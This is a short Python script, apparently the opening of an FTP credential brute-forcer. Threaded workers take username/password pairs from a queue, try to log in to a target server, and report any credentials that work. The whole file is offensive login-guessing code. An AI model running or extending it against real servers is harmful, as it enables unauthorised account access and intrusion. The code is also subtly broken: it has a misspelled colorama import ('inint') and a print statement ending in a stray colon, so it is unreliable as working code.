import ftplib
from threading import Thread
import queue
from colorama import inint, Fore
import sys 
import argparse
import itertools
import string

q = queue.Queue()

def connect_ftp(host, port):
    global q
    while True:
        user, password = q.get()
        try:
            with ftplib.FTP() as server:
                print(f'[!] Trying: {password}'):
                server.connect(host, port, timeout=5)
                server.login(user, password)
                print(f"{Fore.GREEN}[+] Found Credentials: ")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f'\tPassword: {password}{Fore.RESET}')

                #Clear the queue
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}")
        finally:
            q.task_done()